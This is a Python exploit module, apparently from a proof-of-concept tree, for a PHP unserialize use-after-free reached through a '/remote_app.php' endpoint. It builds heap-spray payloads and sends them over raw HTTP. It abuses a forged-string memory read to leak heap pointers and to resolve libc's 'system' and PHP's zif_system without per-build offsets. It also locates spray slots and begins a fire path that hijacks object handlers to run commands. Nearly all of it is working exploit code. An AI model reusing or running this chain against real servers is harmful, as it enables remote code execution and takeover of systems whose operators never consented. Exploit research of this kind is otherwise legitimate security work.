#!/usr/bin/env python3
# INDEX: offset-free symbol resolve via gnu_hash and got | all | needs zend_string read backend
"""Offset-free ELF/symbol resolver over an injected read backend.

Capability: given a backend that reads victim memory with zend_string
semantics, resolve PHP/libc symbols by walking .gnu_hash / .dynsym / .dynstr
and the GOT from an ELF image base, with no per-build symbol offsets. Install
a backend with ``set_read_backend(fn)``; a no-op dummy is installed at import
time so the module imports cleanly with no live target.

Generalized so it runs on ANY read backend, and adapted so no single backend
read exceeds 16384 bytes (16 KB): larger logical reads are assembled from
successive ``read_mem`` calls.

BACKEND CONTRACT
    read_backend(fake_str_addr, timeout) -> (slen:int, data:bytes) | None

  * ``slen`` is the length field read FROM victim memory at
    ``fake_str_addr + 0x10`` (NOT supplied by the caller); ``data`` are the
    bytes at ``fake_str_addr + 0x18`` and MAY be shorter than ``slen``. To read
    a target address ``T``, pass ``fake_str_addr = T - 0x18``.
  * Returns ``None`` on crash / failure. DATA is capped at 16384 bytes per call.
  * The backend MUST increment the module global ``req_count`` once per request
    it issues; ``crash_count`` is handled by ``_backend_read``, not the backend.
"""

import importlib.util
import os
import socket
import struct
import sys
import time


# Sibling primitive loader (poc-root-relative; _HERE/_POC_ROOT fallback so it
# resolves whether imported as a package module or exec'd by path).
_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/


def _load(name, relpath):
    """Load a sibling primitive module by its poc-root-relative path."""
    path = os.path.join(_POC_ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Canonical dispatch primitives (spray-slot scan + fire-payload builder) and
# the shared DT_PLTRELSZ GOT reader.
_dispatch_spray = _load("dispatch_spray", "primitives/dispatch/spray_slot.py")
_dispatch_fire = _load("dispatch_fire", "primitives/dispatch/fire.py")
_gotread = _load("got_pltrelsz_read", "primitives/read_leak/got_pltrelsz_read.py")


def _elf_resolver():
    """Lazily load the canonical ELF/.gnu_hash resolver, wired to this module's
    read backend and its chunking ELF window; cached. Lazy because elf_resolver
    imports gnu_hash_lookup_window from this module, so a top-level load would
    recurse during import."""
    cache = _elf_resolver.__dict__.setdefault("_cache", {})
    if "m" not in cache:
        m = _load("elf_resolver", "primitives/read_leak/elf_resolver.py")
        m.set_read_backend(_backend_read)
        m.set_read_window(_elf_read_window)
        m.set_req_source(lambda: req_count)
        cache["m"] = m
    return cache["m"]


# Constants and configuration.
PATH = "/remote_app.php"   # target endpoint (set by run_chain, used only by
HOST = "127.0.0.1"         # the UAF-specific fire path below)
PORT = 80

SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8

# 48-bit cap covers x86_64 (47-bit canonical) and aarch64 (48-bit VA).
ADDR_MAX = 0x0000FFFFFFFFFFFF

req_count = 0
crash_count = 0

# --- 16 KB adaptation knobs -------------------------------------------------
CHUNK = 16384              # hard per-call DATA cap enforced by read_mem
WINDOW_MAX = 0x400000      # cap for an assembled ELF window (up to ~4MB)
GOT_MAX = 0x30000          # cap for the assembled GOT dump (~85KB + headroom)
HT_MAX = 0x40000           # cap for the assembled class_table arData block


# Injected read backend plumbing.
def _dummy_backend(fake_str_addr, timeout=5):
    """Import-time placeholder. Returns None (no live target)."""
    return None


_BACKEND = _dummy_backend


def set_read_backend(fn):
    """Install the read backend. ``fn`` must honor the BACKEND CONTRACT above."""
    global _BACKEND
    _BACKEND = fn


def _backend_read(fake_str_addr, timeout=5):
    """Single backend call with crash bookkeeping.

    crash_count increments on a None return, and every 5th crash sleeps 0.5s.
    Returns (slen, data) or None.
    """
    global crash_count
    r = _BACKEND(fake_str_addr, timeout)
    if r is None:
        crash_count += 1
        if crash_count % 5 == 0:
            time.sleep(0.5)
        return None
    return r


def read_mem(T, size, timeout=5):
    """Assemble ``size`` bytes starting at victim address ``T`` using multiple
    <=16 KB backend calls, concatenating the data.

    For each 16 KB step the backend is called at ``(T + off) - 0x18`` (so its
    data region lands on ``T + off``) and at most ``min(16384, size - off)``
    bytes are taken from the returned data. Because the caller already KNOWS
    the desired ``size``, this loop is driven by ``size`` and does NOT depend on
    the natural length field at ``+0x10``.

    Returns the assembled bytes (which MAY be shorter than ``size`` if the
    victim returned a short chunk), or None if any chunk fails or comes back
    empty. A wrong/short read therefore degrades to a shorter window, which the
    bounds-checked ``rd`` helpers downstream turn into a miss, never a wrong
    address.
    """
    if size <= 0:
        return b''
    out = bytearray()
    for off in range(0, size, CHUNK):
        want = min(CHUNK, size - off)
        r = _backend_read((T + off) - 0x18, timeout)
        if r is None:
            return None
        _slen, data = r
        if not data:
            return None
        piece = data[:want]
        out += piece
        if len(piece) < want:
            # Victim returned a short (but non-empty) chunk: the mapping likely
            # ends here. Stop and hand back what we have; downstream bounds
            # checks degrade the partial window to a miss.
            break
    return bytes(out)


# HTTP transport + inner payload (used only by the UAF-specific
# heap_leak/_fire_cmd/trigger_rce that keep run_chain's end-to-end structure).
def _build_inner():
    props = ''
    for k in range(NUM_PROPS):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return f'O:8:"stdClass":{NUM_PROPS}:{{{props}}}'


INNER = _build_inner()
C_PART = f'C:10:"CachedData":{len(INNER)}:{{{INNER}}}'


def urlencode_bytes(data):
    out = bytearray()
    for b in data:
        if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
            out.append(b)
        else:
            out.extend(f'%{b:02X}'.encode())
    return bytes(out)


def send_http(payload, host=None, port=None, timeout=3):
    """POST a serialize payload to remote_app.php, return body bytes or None."""
    if host is None:
        host = HOST
    if port is None:
        port = PORT
    global req_count
    req_count += 1
    body = b'cook=' + urlencode_bytes(payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except Exception:
        return None
    resp = b''
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()
    if b'\r\n\r\n' in resp:
        hdr, body_data = resp.split(b'\r\n\r\n', 1)
        if b' 500 ' in hdr.split(b'\r\n')[0]:
            return None
        return body_data
    return resp


# Hash functions.
def gnu_hash_func(name):
    h = 5381
    for c in name:
        h = (h * 33 + c) & 0xFFFFFFFF
    return h


def php_djb_hash(key, set_top_bit=False):
    """PHP's unseeded DJBX33A (zend_string hash); set_top_bit ORs bit 63."""
    h = 5381
    for c in (key.encode() if isinstance(key, str) else key):
        h = ((h << 5) + h + c) & 0xFFFFFFFFFFFFFFFF
    return (h | 0x8000000000000000) if set_top_bit else h


# .gnu_hash window lookup (pure logic, bounds-checked rd; a short window
# degrades to a miss).
def gnu_hash_lookup_window(wdata, wbase, gh_addr, symtab, strtab, names):
    """Resolve symbol names via .gnu_hash inside a flat window of bytes."""
    def rd(addr, sz):
        off = addr - wbase
        if off < 0 or off + sz > len(wdata):
            return None
        return wdata[off:off + sz]

    hdr = rd(gh_addr, 16)
    if hdr is None:
        return {}
    nbuckets, symoffset, bloom_size, bloom_shift = struct.unpack('<IIII', hdr)
    bloom_addr = gh_addr + 16
    buckets_addr = bloom_addr + 8 * bloom_size
    chain_addr = buckets_addr + 4 * nbuckets
    results = {}

    for name in names:
        nb = name.encode('latin-1')
        h = gnu_hash_func(nb)
        wi = (h // 64) % bloom_size
        bw = rd(bloom_addr + 8 * wi, 8)
        if bw is None:
            continue
        bword = struct.unpack('<Q', bw)[0]
        bit_pair = (1 << (h & 63)) | (1 << ((h >> bloom_shift) & 63))
        if (bword & bit_pair) != bit_pair:
            continue
        bk = rd(buckets_addr + 4 * (h % nbuckets), 4)
        if bk is None:
            continue
        si = struct.unpack('<I', bk)[0]
        if si == 0:
            continue
        for _ in range(64):
            chv = rd(chain_addr + 4 * (si - symoffset), 4)
            if chv is None:
                break
            cv = struct.unpack('<I', chv)[0]
            if (cv | 1) == (h | 1):
                sym = rd(symtab + 24 * si, 24)
                if sym is None:
                    break
                st_name = struct.unpack_from('<I', sym, 0)[0]
                st_value = struct.unpack_from('<Q', sym, 8)[0]
                nm = rd(strtab + st_name, len(nb) + 1)
                if nm and nm[:len(nb)] == nb and nm[len(nb):len(nb) + 1] == b'\x00':
                    results[name] = st_value
                    break
            if cv & 1:
                break
            si += 1
    return results


# UAF-specific heap_leak: unused by default (run_chain takes an injected seed).
def heap_leak():
    """R-1: spray, attach R: ref to a sprayed bucket, recover the heap pointer
    that ZVAL_MAKE_REF wrote on top of the spray contents.
    """
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload)
    if output is None:
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    search_pos = 0
    while True:
        pos = output.find(b's:280:"', search_pos)
        if pos < 0:
            break
        dstart = pos + 7
        if dstart + SPRAY_LEN > len(output):
            break
        sdata = output[dstart:dstart + SPRAY_LEN]
        for k in range(7):
            bucket_idx = k + 1
            vo = 8 + bucket_idx * 32
            if vo + 8 > len(sdata):
                break
            orig = struct.unpack_from('<Q', spray, vo)[0]
            curr = struct.unpack_from('<Q', sdata, vo)[0]
            if orig != curr and curr > 0x10000:
                return curr
        search_pos = dstart + SPRAY_LEN
    return None


# ELF probing helpers.
def _read_elf_header(addr):
    """Return e_phnum if addr looks like an ELF base, else None.

    Small read (64B header) -> single backend call.
    """
    return _elf_resolver()._read_elf_header(addr)


def _find_elf_base(ptr, max_pages=256):
    """Scan backward from ptr in 4KB steps looking for an ELF magic page.

    Probe reads only -> single backend calls.
    """
    return _elf_resolver()._find_elf_base(ptr, max_pages=max_pages)


# ELF window read + symbol resolution.
def _elf_read_window(base, phnum):
    """Read a large flat window of an ELF using phdr fields as len anchors.

    Returns (wbase, wdata, wlen) or None. The window covers .gnu_hash,
    symtab, strtab for typical libphp/libc layouts.

    16 KB ADAPTATION: the final window read (up to ~4MB) is assembled via
    read_mem once the natural length exceeds 16 KB. The phdr-field DISCOVERY
    read stays a single call: it only needs <=56-byte phdr entries and uses the
    returned slen to learn p_filesz/p_memsz/p_align sizes.
    """
    # Find a phdr field large enough to use as a fake-string len anchor.
    # phdr layout (56 bytes): p_type p_flags p_offset p_vaddr p_paddr
    #                          p_filesz p_memsz p_align
    phdr_data = None
    phdr_data_base = None
    for pi in range(3):
        for foff in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
            field_addr = base + 0x40 + pi * 56 + foff
            # small discovery read: single backend call
            r = _backend_read(field_addr - 0x10, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen >= 56 and len(sdata) >= 56:
                phdr_data = sdata
                phdr_data_base = field_addr - 0x10 + 0x18
                break
        if phdr_data is not None:
            break
    if phdr_data is None:
        return None

    # For each PT_LOAD/PT_PHDR, gather candidate (field_addr, val) pairs.
    candidates = []
    for i in range(phnum):
        phdr_addr = base + 0x40 + i * 56
        off = phdr_addr - phdr_data_base
        if off < 0 or off + 56 > len(phdr_data):
            continue
        p_type = struct.unpack_from('<I', phdr_data, off)[0]
        if p_type not in (1, 6):  # PT_LOAD, PT_PHDR
            continue
        for field_off in (0x30, 0x20, 0x28):
            field_addr = phdr_addr + field_off
            val_off = field_addr - phdr_data_base
            if val_off < 0 or val_off + 8 > len(phdr_data):
                continue
            val = struct.unpack_from('<Q', phdr_data, val_off)[0]
            if 0x1000 <= val < 0x10000000:
                candidates.append((field_addr, val))

    if not candidates:
        return None

    # Prefer moderate sizes (0x10000-0x400000) over giant lens that may cross
    # unmapped gaps and crash the worker.
    def sort_key(c):
        v = c[1]
        if 0x10000 <= v <= 0x400000:
            return (0, -v)
        return (1, -v)
    candidates.sort(key=sort_key)

    for field_addr, _expected in candidates[:5]:
        # Discovery call: learn the natural window length. Its
        # data region begins at (field_addr - 0x10) + 0x18 == field_addr + 8.
        r = _backend_read(field_addr - 0x10, timeout=3)
        if r is None:
            continue
        wlen, first = r
        if len(first) < 0x1000:
            continue
        want = min(wlen, WINDOW_MAX)
        if want <= CHUNK:
            wdata = first[:want]
        else:
            # >16KB window: assemble across successive 16KB backend calls.
            wdata = read_mem(field_addr + 8, want, timeout=3)
            if wdata is None or len(wdata) < 0x1000:
                continue
        return (field_addr + 8, wdata, wlen)
    return None


def _elf_resolve_symbols(base, phnum, names):
    """Walk PT_DYNAMIC + .gnu_hash to resolve `names` for the ELF at `base`.

    Returns dict mapping name -> absolute address. Special keys:
      __pltgot__   -> DT_PLTGOT absolute address (needed for libc discovery)
      __dynamic__  -> PT_DYNAMIC virtual address
    """
    return _elf_resolver()._elf_resolve_symbols(base, phnum, names)


# Phase functions.
def scan_for_elf(chunk):
    """Find libphp's ELF base near the heap chunk. All reads go through
    _read_elf_header, i.e. single backend calls.
    """
    return _elf_resolver().scan_for_elf(chunk)


def gnu_hash_resolve(elf_base, *names):
    """Walk PT_DYNAMIC + .gnu_hash at `elf_base` and resolve each requested
    symbol.
    """
    return _elf_resolver().gnu_hash_resolve(elf_base, *names)


def libc_from_got_dump(elf_base, pltgot):
    """Read libphp's .dynamic via DT_PLTRELSZ as a fake-string len, dump the
    GOT, cluster external pointers, scan back to libc's ELF base.

    16 KB ADAPTATION: the full GOT (~85KB) is assembled via read_mem. The
    .dynamic anchor read stays a single call (it only uses <=1KB of data).
    """
    print("\n[Phase R-4] Libc discovery via GOT dump")

    _gotread.set_resolver(_elf_resolver())
    got_data, data_start = _gotread.read_got_via_pltrelsz(_backend_read, elf_base)
    if got_data is None:
        return None
    got_addr = pltgot
    print(f"    GOT read: {len(got_data)} bytes")

    libphp_end = elf_base + 0x1800000

    # Collect external pointers (outside libphp) clustered by ~0.5MB proximity.
    ext_ptrs = []
    if got_addr >= data_start and got_addr < data_start + len(got_data):
        for gi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, gi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if elf_base <= ptr < libphp_end:
                continue
            if not any(abs(ptr - ep) < 0x80000 for ep in ext_ptrs):
                ext_ptrs.append(ptr)
    else:
        for qi in range(0, len(got_data) - 7, 8):
            ptr = struct.unpack_from('<Q', got_data, qi)[0]
            if ptr < 0x100000000 or ptr > ADDR_MAX:
                continue
            if abs(ptr - elf_base) > 0x2000000:
                if not any(abs(ptr - ep) < 0x200000 for ep in ext_ptrs):
                    ext_ptrs.append(ptr)

    nearby = [p for p in ext_ptrs if abs(p - elf_base) < 0x10000000]
    nearby.sort()
    print(f"    External pointer groups: {len(ext_ptrs)} total, {len(nearby)} nearby")

    for nidx, ep in enumerate(nearby):
        print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
        page = ep & ~0xFFF
        for est_off in range(0x7F000, 0x1F000, -0x1000):
            cand = page - est_off
            if cand <= 0:
                continue
            epn = _read_elf_header(cand)
            if epn is None:
                continue
            print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
            if epn >= 12:
                syms = _elf_resolve_symbols(cand, epn, ['system'])
                if syms and 'system' in syms:
                    print(f"      libc @ 0x{cand:x}, system @ 0x{syms['system']:x}")
                    return cand
        result = _find_elf_base(ep, max_pages=128)
        if result:
            ebase, epn, _ = result
            print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
            syms = _elf_resolve_symbols(ebase, epn, ['system'])
            if syms and 'system' in syms:
                print(f"      libc @ 0x{ebase:x}, system @ 0x{syms['system']:x}")
                return ebase

    return None


def _read_eg_slot(eg, slot_off, bss_window=0x10000):
    """a7-safe read of the pointer at eg+slot_off via a BSS anchor sweep: forge a
    string at successive eg+scan_off until the natural length is sane and its
    window covers the slot, then slice the qword. This echo-serialize read has NO
    server-side substr cap, so a fixed-address read whose preceding qword happens
    to be a pointer SIGSEGVs the worker; sweeping for a sane-length anchor is the
    portable read (proven live on cli/fpm for EG.class_table)."""
    slot_addr = eg + slot_off
    bss_end = eg + bss_window
    for scan_off in range(-0x800, slot_off, 8):
        fs = eg + scan_off
        data_start = fs + 0x18
        if data_start > slot_addr:
            continue
        off_in = slot_addr - data_start
        max_len = bss_end - data_start
        if max_len <= 0:
            continue
        r = _backend_read(fs)
        if r is None:
            continue
        slen, sdata = r
        if slen <= 0 or slen > max_len:
            continue
        if off_in + 8 <= len(sdata):
            return struct.unpack_from('<Q', sdata, off_in)[0]
    return None


def _sweep_window(target, span, max_len=0x8000, max_k=0x800):
    """a7-safe read of `span` bytes at `target`: sweep forge anchors below the
    target until one yields a sane natural length whose window covers
    [target, target+span). The uncapped echo-serialize read crashes when the
    preceding qword is a pointer (huge len), so this is the portable heap read."""
    win_hi = target + span
    for k in range(0, max_k, 8):
        fs = target - 0x18 - k        # data region begins at fs+0x18 = target-k
        r = _backend_read(fs)
        if r is None:
            continue
        slen, data = r
        data_start = fs + 0x18
        if slen <= 0 or slen > max_len:
            continue
        off = target - data_start
        if off < 0 or off + span > len(data):
            continue
        return data[off:off + span]
    return None


def _ht_lookup_bval(ht_addr, name, max_block=0x8000):
    """Read a zend_array (HashTable) at ht_addr, DJBX33A-lookup `name`, return the
    first qword of the matching bucket -- Z_PTR for a pointer table: a
    zend_class_entry* (class_table) or a zend_function* (function_table) -- else
    None. Generalizes lookup_class_table's walk for lookup_function_handler;
    ports functable_resolver's RW hash walk onto this module's anchor-safe read
    (every read sweeps for a sane natural length because a7's echo-serialize sink
    has no server-side substr cap). A small table is read as one windowed block;
    the (much larger) function_table is walked bucket-by-bucket along the
    collision chain so no multi-chunk block read is needed."""
    if not ht_addr or ht_addr < 0x10000 or ht_addr > ADDR_MAX:
        return None
    htdata = _sweep_window(ht_addr, 32)
    if htdata is None:
        return None
    flags_mask = struct.unpack_from('<Q', htdata, 8)[0]
    arData = struct.unpack_from('<Q', htdata, 16)[0]
    nUsed = struct.unpack_from('<I', htdata, 24)[0]
    nTableMask = (flags_mask >> 32) & 0xFFFFFFFF
    mask_s = nTableMask if nTableMask < 0x80000000 else nTableMask - 0x100000000
    if mask_s >= 0 or arData < 0x10000 or arData > ADDR_MAX:
        return None
    hash_size = (-mask_s) * 4
    alloc_start = arData - hash_size
    needed = hash_size + nUsed * 32
    if needed <= 0:
        return None

    key_b = name.encode('latin-1')
    h = php_djb_hash(key_b)
    h_flag = h | 0x8000000000000000
    si = (h | (mask_s & 0xFFFFFFFF)) & 0xFFFFFFFF
    si_s = si - 0x100000000 if si >= 0x80000000 else si

    def _hit(bval, bnext, bh, bkey):
        """-> (bval_on_match_or_None, stop_chain)."""
        if (bh == h_flag or bh == h) and 0x10000 < bkey < ADDR_MAX:
            rk = _backend_read(bkey)
            if rk and rk[0] == len(key_b) and rk[1][:len(key_b)] == key_b:
                return bval, True
        return None, (bnext == 0xFFFFFFFF)

    # Small table (class-table scale): one windowed block + in-memory walk.
    if needed <= max_block:
        ddata = _sweep_window(alloc_start, needed, max_len=max_block + 0x1000)
        if ddata is not None and len(ddata) >= hash_size:
            hso = (si_s + (-mask_s)) * 4
            if 0 <= hso and hso + 4 <= len(ddata):
                bi = struct.unpack_from('<I', ddata, hso)[0]
                for _ in range(64):
                    if bi >= nUsed or bi == 0xFFFFFFFF:
                        break
                    bo = hash_size + bi * 32
                    if bo + 32 > len(ddata):
                        break
                    res, stop = _hit(
                        struct.unpack_from('<Q', ddata, bo)[0],
                        struct.unpack_from('<I', ddata, bo + 12)[0],
                        struct.unpack_from('<Q', ddata, bo + 16)[0],
                        struct.unpack_from('<Q', ddata, bo + 24)[0])
                    if res is not None:
                        return res
                    if stop:
                        break
                    bi = struct.unpack_from('<I', ddata, bo + 12)[0]
                return None

    # Large table (function_table) or block read missed: walk the collision
    # chain with per-slot / per-bucket windowed sweeps (only a few reads). The
    # initial hash slot sits at arData + si_s*4 (negative index into the hashes).
    slot = _sweep_window(arData + si_s * 4, 4)
    if slot is None:
        return None
    bi = struct.unpack_from('<I', slot, 0)[0]
    for _ in range(64):
        if bi >= nUsed or bi == 0xFFFFFFFF:
            break
        b = _sweep_window(arData + bi * 32, 32)
        if b is None:
            return None
        res, stop = _hit(struct.unpack_from('<Q', b, 0)[0],
                         struct.unpack_from('<I', b, 12)[0],
                         struct.unpack_from('<Q', b, 16)[0],
                         struct.unpack_from('<Q', b, 24)[0])
        if res is not None:
            return res
        if stop:
            break
        bi = struct.unpack_from('<I', b, 12)[0]
    return None


def lookup_class_table(eg, name):
    """Read EG, then EG.class_table HashTable, DJBX33A-lookup `name`, return the
    associated zend_class_entry pointer.

    16 KB ADAPTATION: the entire class_table arData block is assembled via
    read_mem using the hash_size + nUsed*32 size already learned from the
    HashTable struct. The BSS anchor sweep, the HT struct read and the key read
    stay single calls (each uses <=few-KB of data and relies on the natural len
    for validation).
    """
    print(f"\n[Phase R-5] EG and stdClass class entry")
    print(f"  EG @ 0x{eg:x}")

    bss_end = eg + 0x10000
    ct_addr = eg + 0x1D0

    class_table = None
    for scan_off in range(-0x800, 0x1C0, 8):
        fs = eg + scan_off
        data_start = fs + 0x18
        if data_start > ct_addr:
            continue
        ct_data_off = ct_addr - data_start
        max_len = bss_end - data_start
        if max_len <= 0:
            continue
        # anchor-sweep: single call; only ~few-KB of data needed, slen validated
        r = _backend_read(fs)
        if r is None:
            continue
        slen, sdata = r
        if slen <= 0 or slen > max_len:
            continue
        if ct_data_off + 8 <= len(sdata):
            class_table = struct.unpack_from('<Q', sdata, ct_data_off)[0]
            print(f"  anchor at EG{scan_off:+#06x}: len={slen}")
            print(f"    class_table = 0x{class_table:x}")
            break

    if not class_table or class_table < 0x10000 or class_table > ADDR_MAX:
        return None

    # Read the class_table HashTable struct (first 32 bytes) -> single call.
    r = _backend_read(class_table - 0x18)
    if r is None or r[0] < 48 or len(r[1]) < 32:
        return None
    _htlen, htdata = r
    flags_mask = struct.unpack_from('<Q', htdata, 8)[0]
    arData = struct.unpack_from('<Q', htdata, 16)[0]
    nUsed = struct.unpack_from('<I', htdata, 24)[0]
    nTableMask = (flags_mask >> 32) & 0xFFFFFFFF
    mask_s = nTableMask if nTableMask < 0x80000000 else nTableMask - 0x100000000
    print(f"  class_table HT: nTableMask={mask_s} arData=0x{arData:x} nUsed={nUsed}")

    hash_size = (-mask_s) * 4
    alloc_start = arData - hash_size

    # The arData block (hash table + bucket array) can exceed 16 KB. Its exact
    # size is known: hash_size + nUsed*32. Drive read_mem by that size; small
    # blocks use a single call. Data region begins at alloc_start.
    needed = hash_size + nUsed * 32
    if needed <= 0:
        return None
    if needed > CHUNK:
        ddata = read_mem(alloc_start, min(needed, HT_MAX))
        if ddata is None:
            return None
    else:
        r = _backend_read(alloc_start - 0x18)
        if r is None:
            return None
        _dlen, ddata = r

    key_b = name.encode('latin-1')
    h = php_djb_hash(key_b)
    si = (h | (mask_s & 0xFFFFFFFF)) & 0xFFFFFFFF
    si_s = si - 0x100000000 if si >= 0x80000000 else si
    hso = (si_s + (-mask_s)) * 4
    if hso < 0 or hso + 4 > len(ddata):
        return None
    bi = struct.unpack_from('<I', ddata, hso)[0]
    if bi == 0xFFFFFFFF:
        return None

    h_flag = h | 0x8000000000000000
    for _ in range(64):
        if bi >= nUsed or bi == 0xFFFFFFFF:
            break
        bo = hash_size + bi * 32
        if bo + 32 > len(ddata):
            break
        bval = struct.unpack_from('<Q', ddata, bo)[0]
        bnext = struct.unpack_from('<I', ddata, bo + 12)[0]
        bh = struct.unpack_from('<Q', ddata, bo + 16)[0]
        bkey = struct.unpack_from('<Q', ddata, bo + 24)[0]
        if (bh == h_flag or bh == h) and 0x10000 < bkey < ADDR_MAX:
            # key read: small single call, name-compared (degrades to a miss)
            rk = _backend_read(bkey)
            if rk and rk[0] == len(key_b) and rk[1][:len(key_b)] == key_b:
                print(f"  {name} ce = 0x{bval:x}")
                return bval
        if bnext == 0xFFFFFFFF:
            break
        bi = bnext
    return None


# EG.function_table slot shifts per minor (0x1b0 on <=8.4, 0x1c8 on >=8.5);
# resolved at runtime by validating the pointed-to HashTable header -- no fixed
# per-build offset (ported from functable_resolver.FT_OFF_CANDIDATES).
FT_SLOT_CANDIDATES = (0x1B0, 0x1C8)


def _read_fn_handler(fn, binbase):
    """Offset-free &zif_* read: zend_internal_function.handler shifts per minor
    (0x48 on 8.3, 0x58 on 8.4/8.5). Sweep a window over fn+0x40..fn+0x68 and
    return the first qword landing in the binary text image
    [binbase, binbase+32 MiB) with a nonzero low32. Ports
    functable_resolver.handler_of to the anchor-safe read (module_entry, the next
    text pointer, sorts after, so the first match wins)."""
    lo, hi = binbase, binbase + 0x2000000
    data = _sweep_window(fn + 0x40, 0x28)   # 0x40..0x68
    if data is None:
        return None
    for i in range(0, 0x28, 8):
        v = int.from_bytes(data[i:i + 8], "little")
        if v and (v & 0xFFFFFFFF) and lo <= v < hi:
            return v
    return None


def lookup_function_handler(eg, name, binbase):
    """Offset-free resolve of an INTERNAL function's handler (&zif_<name>) by an
    RW name-walk of EG.function_table. For targets that are NOT exported dynamic
    symbols -- zif_system et al. are static and the .gnu_hash/.dynsym resolver
    cannot reach them -- this is the only by-name route. Mirrors
    lookup_class_table's EG-slot + HashTable walk and ports
    functable_resolver's runtime offset derivations (function_table slot + handler
    field), over this module's anchor-safe read backend. Returns (handler, fn) or
    (None, None)."""
    print(f"\n[Phase R-5b] EG.function_table name-walk -> &zif_{name}")
    for slot in FT_SLOT_CANDIDATES:
        ft = _read_eg_slot(eg, slot)
        if not ft or ft < 0x10000 or ft > ADDR_MAX:
            print(f"  EG+{slot:#x}: slot read miss ({ft and hex(ft)})")
            continue
        htdata = _sweep_window(ft, 32)   # validate a function-table HT header
        if htdata is None:
            print(f"  EG+{slot:#x}: ft=0x{ft:x} HT header read miss")
            continue
        flags_mask = struct.unpack_from('<Q', htdata, 8)[0]
        nUsed = struct.unpack_from('<I', htdata, 24)[0]
        mask32 = (flags_mask >> 32) & 0xFFFFFFFF
        if not (0xFFFFF000 <= mask32 <= 0xFFFFFFFF and 200 <= nUsed <= 60000):
            print(f"  EG+{slot:#x}: ft=0x{ft:x} not a function table "
                  f"(mask={mask32:#x} nUsed={nUsed})")
            continue
        fn = _ht_lookup_bval(ft, name)
        if not fn or fn < 0x10000 or fn > ADDR_MAX:
            print(f"  EG+{slot:#x}: ft=0x{ft:x} (nUsed={nUsed}) "
                  f"name-walk miss for {name!r} (fn={fn and hex(fn)})")
            continue
        handler = _read_fn_handler(fn, binbase)
        print(f"  function_table @ EG+{slot:#x} = 0x{ft:x} (nUsed={nUsed}); "
              f"{name} fn=0x{fn:x} handler={handler and hex(handler)}")
        if handler:
            return handler, fn
    print(f"  function_table walk failed for {name!r}")
    return None, None


def find_spray_slot(heap_ref):
    """Walk ZendMM chunk metadata to identify the run page holding the freed
    allocation, probe its slots for our spray strings, return absolute S.

    All reads here are small (<=~2.5KB page map; 1-field slot probes) -> single
    backend calls.
    """
    print(f"\n[Phase R-6] Spray slot discovery")
    chunk_base = heap_ref & ~0x1FFFFF
    print(f"  chunk_base = 0x{chunk_base:x}")

    # page map read: single call (needs MAP_OFF + 512*4 ~= 2.5KB of data)
    r = _backend_read(chunk_base + 0x40)
    if r is None:
        return None
    _heap_size, cdata = r

    MAP_OFF = 0x1F8
    if len(cdata) < MAP_OFF + 512 * 4:
        return None

    candidates = []
    for pn in range(1, 512):
        info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
        if info == 0:
            continue
        is_srun = (info & 0x80000000) != 0
        is_lrun = (info & 0x40000000) != 0
        if not (is_srun or is_lrun):
            continue
        likely = ((is_srun and (info & 0x1F) == 16)       # bin-320 SRUN (8.5.11)
                  or (is_lrun and (info & 0xFFFF) == 1))   # 1-page LRUN (8.5.12)
        candidates.append((0 if likely else 1, pn, info))

    if not candidates:
        return None

    candidates.sort()
    info_by_pn = {pn: info for _prio, pn, info in candidates}
    S = _dispatch_spray.find_spray_slot_scan(
        _backend_read, chunk_base,
        match=lambda r2: r2 is not None and r2[0] == SPRAY_LEN,
        band=[pn for _prio, pn, _info in candidates],
        with_offset=False, use_map=None, probe_budget=None)
    if S is not None:
        addr = S - 0x18
        pn = (addr - chunk_base) // 0x1000
        slot = (addr - chunk_base - pn * 0x1000) // 320
        print(f"  Found spray at page {pn} slot {slot} "
              f"@ 0x{addr:x} (map info=0x{info_by_pn[pn]:x})")
        print(f"  S = 0x{S:x}")
    return S


# Fire path (UAF-specific write via send_http) that keeps run_chain's
# end-to-end structure.
def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14):
    """One trigger: forge a stdClass whose handlers->get_properties_for
